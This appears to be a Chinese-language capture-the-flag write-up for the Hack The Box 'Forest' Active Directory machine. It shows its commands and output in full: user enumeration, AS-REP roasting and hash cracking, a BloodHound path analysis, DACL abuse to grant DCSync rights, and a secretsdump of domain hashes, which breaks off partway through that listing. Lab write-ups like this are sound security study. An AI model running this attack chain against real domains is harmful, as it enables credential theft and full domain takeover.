## Recon

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ rustscan -a 10.129.95.210 -r 1-65535 -- -sC -sV -Pn                
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Making networking exciting since... whenever.

[~] The config file is expected to be at "/home/dkri3c1/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.95.210:53
Open 10.129.95.210:88
Open 10.129.95.210:135
Open 10.129.95.210:139
Open 10.129.95.210:389
Open 10.129.95.210:445
Open 10.129.95.210:464
Open 10.129.95.210:593
Open 10.129.95.210:636
Open 10.129.95.210:3268
Open 10.129.95.210:3269
Open 10.129.95.210:5985
Open 10.129.95.210:9389
Open 10.129.95.210:47001
Open 10.129.95.210:49664
Open 10.129.95.210:49665
Open 10.129.95.210:49666
Open 10.129.95.210:49667
Open 10.129.95.210:49671
Open 10.129.95.210:49680
Open 10.129.95.210:49681
Open 10.129.95.210:49685
Open 10.129.95.210:49697
Open 10.129.95.210:49860
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -Pn" on ip 10.129.95.210
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-25 22:31 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:31
Completed NSE at 22:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:31
Completed NSE at 22:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:31
Completed NSE at 22:31, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 22:31
Completed Parallel DNS resolution of 1 host. at 22:31, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 22:31
Scanning 10.129.95.210 [24 ports]
Discovered open port 139/tcp on 10.129.95.210
Discovered open port 445/tcp on 10.129.95.210
Discovered open port 135/tcp on 10.129.95.210
Discovered open port 464/tcp on 10.129.95.210
Discovered open port 49680/tcp on 10.129.95.210
Discovered open port 49681/tcp on 10.129.95.210
Discovered open port 389/tcp on 10.129.95.210
Discovered open port 88/tcp on 10.129.95.210
Discovered open port 53/tcp on 10.129.95.210
Discovered open port 3269/tcp on 10.129.95.210
Discovered open port 9389/tcp on 10.129.95.210
Discovered open port 3268/tcp on 10.129.95.210
Discovered open port 636/tcp on 10.129.95.210
Discovered open port 49860/tcp on 10.129.95.210
Discovered open port 47001/tcp on 10.129.95.210
Discovered open port 49685/tcp on 10.129.95.210
Discovered open port 49664/tcp on 10.129.95.210
Discovered open port 49667/tcp on 10.129.95.210
Discovered open port 593/tcp on 10.129.95.210
Discovered open port 49665/tcp on 10.129.95.210
Discovered open port 49666/tcp on 10.129.95.210
Discovered open port 49671/tcp on 10.129.95.210
Discovered open port 5985/tcp on 10.129.95.210
Discovered open port 49697/tcp on 10.129.95.210
Completed SYN Stealth Scan at 22:31, 0.19s elapsed (24 total ports)
Initiating Service scan at 22:31
Scanning 24 services on 10.129.95.210
Completed Service scan at 22:32, 55.50s elapsed (24 services on 1 host)
NSE: Script scanning 10.129.95.210.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:32
Completed NSE at 22:32, 11.24s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:32
Completed NSE at 22:32, 2.25s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:32
Completed NSE at 22:32, 0.00s elapsed
Nmap scan report for 10.129.95.210
Host is up, received user-set (0.087s latency).
Scanned at 2026-04-25 22:31:08 EDT for 69s

PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-04-26 02:38:04Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49860/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-04-25T19:38:56-07:00
| smb2-time: 
|   date: 2026-04-26T02:38:58
|_  start_date: 2026-04-26T02:29:58
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m50s, deviation: 4h02m30s, median: 6m49s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 36501/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 28118/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 32697/udp): CLEAN (Timeout)
|   Check 4 (port 38836/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:32
Completed NSE at 22:32, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:32
Completed NSE at 22:32, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:32
Completed NSE at 22:32, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.42 seconds
           Raw packets sent: 24 (1.056KB) | Rcvd: 24 (1.056KB)
```

## Exploit 


這台想以打 guide 的模式進行，首先可以從 rustscan 的結果發現 domain 是 htb.local，發現他有開 smb 的 port ，對他用 smbclient 去列 share list 會發現沒東西

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ smbclient -L \\\\10.129.95.210
Password for [WORKGROUP\dkri3c1]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.95.210 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

於是想說用 crackmapexec 去測看看有沒有使用者可以撈出來

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ crackmapexec smb 10.129.95.210 --users 
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.95.210   445    FOREST           [-] Error enumerating domain users using dc ip 10.129.95.210: NTLM needs domain\username and a password
SMB         10.129.95.210   445    FOREST           [*] Trying with SAMRPC protocol
SMB         10.129.95.210   445    FOREST           [+] Enumerated domain user(s)
SMB         10.129.95.210   445    FOREST           htb.local\Administrator                  Built-in account for administering the computer/domain
SMB         10.129.95.210   445    FOREST           htb.local\Guest                          Built-in account for guest access to the computer/domain
SMB         10.129.95.210   445    FOREST           htb.local\krbtgt                         Key Distribution Center Service Account
SMB         10.129.95.210   445    FOREST           htb.local\DefaultAccount                 A user account managed by the system.
SMB         10.129.95.210   445    FOREST           htb.local\$331000-VK4ADACQNUCA           
SMB         10.129.95.210   445    FOREST           htb.local\SM_2c8eef0a09b545acb           
SMB         10.129.95.210   445    FOREST           htb.local\SM_ca8c2ed5bdab4dc9b           
SMB         10.129.95.210   445    FOREST           htb.local\SM_75a538d3025e4db9a           
SMB         10.129.95.210   445    FOREST           htb.local\SM_681f53d4942840e18           
SMB         10.129.95.210   445    FOREST           htb.local\SM_1b41c9286325456bb           
SMB         10.129.95.210   445    FOREST           htb.local\SM_9b69f1b9d2cc45549           
SMB         10.129.95.210   445    FOREST           htb.local\SM_7c96b981967141ebb           
SMB         10.129.95.210   445    FOREST           htb.local\SM_c75ee099d0a64c91b           
SMB         10.129.95.210   445    FOREST           htb.local\SM_1ffab36a2f5f479cb           
SMB         10.129.95.210   445    FOREST           htb.local\HealthMailboxc3d7722           
SMB         10.129.95.210   445    FOREST           htb.local\HealthMailboxfc9daad           
SMB         10.129.95.210   445    FOREST           htb.local\HealthMailboxc0a90c9           
SMB         10.129.95.210   445    FOREST           htb.local\HealthMailbox670628e           
SMB         10.129.95.210   445    FOREST           htb.local\HealthMailbox968e74d           
SMB         10.129.95.210   445    FOREST           htb.local\HealthMailbox6ded678           
SMB         10.129.95.210   445    FOREST           htb.local\HealthMailbox83d6781           
SMB         10.129.95.210   445    FOREST           htb.local\HealthMailboxfd87238           
SMB         10.129.95.210   445    FOREST           htb.local\HealthMailboxb01ac64           
SMB         10.129.95.210   445    FOREST           htb.local\HealthMailbox7108a4e           
SMB         10.129.95.210   445    FOREST           htb.local\HealthMailbox0659cc1           
SMB         10.129.95.210   445    FOREST           htb.local\sebastien                      
SMB         10.129.95.210   445    FOREST           htb.local\lucinda                        
SMB         10.129.95.210   445    FOREST           htb.local\svc-alfresco                   
SMB         10.129.95.210   445    FOREST           htb.local\andy                           
SMB         10.129.95.210   445    FOREST           htb.local\mark                           
SMB         10.129.95.210   445    FOREST           htb.local\santi   
```

然後因為有開 rpc ，所以用 rpcclient 連上去看還有哪些 user

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ rpcclient -U "" -N 10.129.95.210                      
rpcclient $> en
enumalsgroups              enumdomusers               enummonitors               enumprocdatatypes
enumdata                   enumdrivers                enumpermachineconnections  enumprocs
enumdataex                 enumforms                  enumports                  enumtrust
enumdomains                enumjobs                   enumprinters               
enumdomgroups              enumkey                    enumprivs                  
rpcclient $> en
enumalsgroups              enumdomusers               enummonitors               enumprocdatatypes
enumdata                   enumdrivers                enumpermachineconnections  enumprocs
enumdataex                 enumforms                  enumports                  enumtrust
enumdomains                enumjobs                   enumprinters               
enumdomgroups              enumkey                    enumprivs                  
rpcclient $> enmdomusers
command not found: enmdomusers
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

這邊補一些知識，關於 LDAP 跟 rpc 的比較 (ps chatgpt 整理

| 面向   | LDAP          | RPC          |
| ---- | ------------- | ------------ |
| 本質   | 目錄查詢協定        | 遠端函式呼叫機制     |
| 用途   | 查資料           | 執行操作         |
| 資料來源 | Directory（目錄） | Windows 系統服務 |
| 操作方式 | Query（搜尋）     | Call（呼叫）     |
| 典型內容 | 使用者、群組        | 登入驗證、系統管理    |


回到題目，這邊拿了一些資料，把它做成一張表

```bash=
sebastien
santi
mark
andy
svc-alfresco
lucinda
administrator
guest
krbtgt
```

拿到這些帳號之後對他們做 as-rep roasting

```bash=
┌──(dkri3c1🐱dkri3c1)-[~/Desktop/htb/forest]
└─$ sudo impacket-GetNPUsers -dc-ip 10.129.95.210 -no-pass  -usersfile user.txt htb.local/
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:5cbbe2825c4101e6eafdf11f88119ef4$1d2220877817ab0cc355a8255de7a47ac2260165c2c1c5d70dbcec22fdf73d26476bde7512d48cb3dd38c80627b67ebedf31e8d063e3c79af5995514141495d2f5c1904e0838b82f4204de89b49de57dd640357e7c3dc9ae518b8b7a79fa305145d4c1bec7bfadc0f8f9df8c27861605c0d5b3c851ebee637cf33a7fa50e6e8101c2afe08b73fe5b3bfbeb7da4ebc68f06403d54c0431724f2704a839b7d86bf4812aa32dffdbf2286b4866a3b41dae6bea45fdc930474896fb5928e77b6a867b0ca9f59b13035ee09fc0e1a30eadc698f61c12ed576f1e650264f404c07659ae91fa942ed55
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

拿到 alfresco 的 hash，丟去 hashcat 

```bash=
┌──(dkri3c1🐱dkri3c1)-[~/Desktop/htb/forest]
└─$ hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --show
$krb5asrep$23$svc-alfresco@HTB.LOCAL:5cbbe2825c4101e6eafdf11f88119ef4$1d2220877817ab0cc355a8255de7a47ac2260165c2c1c5d70dbcec22fdf73d26476bde7512d48cb3dd38c80627b67ebedf31e8d063e3c79af5995514141495d2f5c1904e0838b82f4204de89b49de57dd640357e7c3dc9ae518b8b7a79fa305145d4c1bec7bfadc0f8f9df8c27861605c0d5b3c851ebee637cf33a7fa50e6e8101c2afe08b73fe5b3bfbeb7da4ebc68f06403d54c0431724f2704a839b7d86bf4812aa32dffdbf2286b4866a3b41dae6bea45fdc930474896fb5928e77b6a867b0ca9f59b13035ee09fc0e1a30eadc698f61c12ed576f1e650264f404c07659ae91fa942ed55:s3rvice
```

解出來是 s3rvice，用 evil-winrm 登上去會拿到 user flag

```bash=
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/25/2026   7:30 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
0072a.....
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> 
```

從這邊開始就要用新的工具去扁了，這邊簡單介紹 bloodhound ，簡單來說就是用來看整個 ad 裡面的權限，然後用視覺化的方式呈現，可以讓你從低權限變成 domain admin

```bash=
sudo apt update && sudo apt install -y bloodhound
```

載完之後先輸入 `sudo neo4j console` 之後連上去 local 端並且把輸入 default credential `neo4j:neo4j` ，然後他會要你改密碼，(改完要記得密碼

然後去 terminal 上輸入 `bloodhound` 會遇到 postgres 有問題，這部分丟給 AI 他就會幫你了 (O

開好之後長這樣

![Screenshot 2026-04-26 at 11.41.48 AM](https://hackmd.io/_uploads/SyFtK-s6Zg.png)

之後在 terminal 輸入這一坨 `bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.129.95.210`

然後你就會發現這裡有一坨

```bash=
┌──(dkri3c1🐱dkri3c1)-[~/Desktop/htb/forest]
└─$ bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.129.95.210
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (FOREST.htb.local:88)] [Errno -3] Temporary failure in name resolution
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Testing resolved hostname connectivity dead:beef::7da2:addc:4adc:4424
INFO: Trying LDAP connection to dead:beef::7da2:addc:4adc:4424
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Testing resolved hostname connectivity dead:beef::7da2:addc:4adc:4424
INFO: Trying LDAP connection to dead:beef::7da2:addc:4adc:4424
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 25S

```

並且多了很多的 json file

```bash=
┌──(dkri3c1🐱dkri3c1)-[~/Desktop/htb/forest]
└─$ ls
20260425232832_computers.json   20260425232832_gpos.json    20260425232832_users.json
20260425232832_containers.json  20260425232832_groups.json  hash.txt
20260425232832_domains.json     20260425232832_ous.json     user.txt
```

把它 load 進去 bloodhound，然後在 search 的地方打上人名並且搭配右上角的拉條可以發現會有很多列表

![Screenshot 2026-04-26 at 11.45.55 AM](https://hackmd.io/_uploads/HylbF9Wsp-x.png)

接下來確認一下我們的目標是拿到 Domain admin ，於是點去 CYPHER ，然後裡面可以找到  Domain admin shortest path 

![Screenshot 2026-04-27 at 2.23.32 PM](https://hackmd.io/_uploads/SJrxbYhpZx.png)

目前我們的使用者是 svc-alfresco 

![Screenshot 2026-04-27 at 2.24.12 PM](https://hackmd.io/_uploads/HyWQ-K3aWg.png)

往後追會發現他有一條路可以透過 WriteDacl 達到 domain admin

![Screenshot 2026-04-27 at 2.25.18 PM](https://hackmd.io/_uploads/rJh8bY26Zg.png)

至於這張圖要怎麼看，就是 SVC-ALFRESCO $\xrightarrow{\text{MemberOf}}$ SERVICE ACCOUNTS $\xrightarrow{\text{MemberOf}}$ PRIVILEGED IT ACCOUNTS $\xrightarrow{\text{MemberOf}}$ ACCOUNT OPERATORS$\xrightarrow{\text{GenericAll}}$ EXCHANGE WINDOWS PERMISSIONS


長話短說就是目前所得到的帳號只是 ACCOUNT OPERATORS ，然後他對 EXCHANGE WINDOWS 有所有的控制權，因此我們可以把自己加入到 EXCHANGE WINDOWS 這個 group ，然後透過他去做 writedacl ，至於整串的手法其實是在 https://zh-tw.docs.tenable.com/identity-exposure/SaaS/Content/User/AttackPath/WriteDACL.htm 看到的，做到 writedacl 之後就可以用 dcsync 去得到 password hash (dcsync 具體就是把自己偽裝成 domain controller 然後透過他去撈其他 user 的 資料)

然後所需的東西包含下面三樣

- Replicating Directory Changes (DS-Replication-Get-Changes)

- Replicating Directory Changes All (DS-Replication-Get-Changes-All)

- Replicating Directory Changes In Filtered Set

回到題目本身，我們現在要做的是把自己加入 `EXCHANGE WINDOWS PERMISSIONS`

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ ┌──(dkri3c1🐱dkri3c1)-[~]
└─$ bloodyAD --host forest.htb.local -d "htb.local" --dc-ip 10.129.205.137 -u svc-alfresco -p s3rvice add groupMember "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco"
[+] svc-alfresco added to EXCHANGE WINDOWS PERMISSIONS
```

之後用 impacket 上的 dacledit 把自己寫入 dcsyncs 的權限

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ impacket-dacledit \
-target-dn 'DC=htb,DC=local' \
-action write \
-rights DCSync \
-principal svc-alfresco \
-dc-ip 10.129.205.137 \
```

然後用 secrethash 去撈 hash 

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.205.137
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:14844f44650c7fde8d152384f0ad1a1d:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
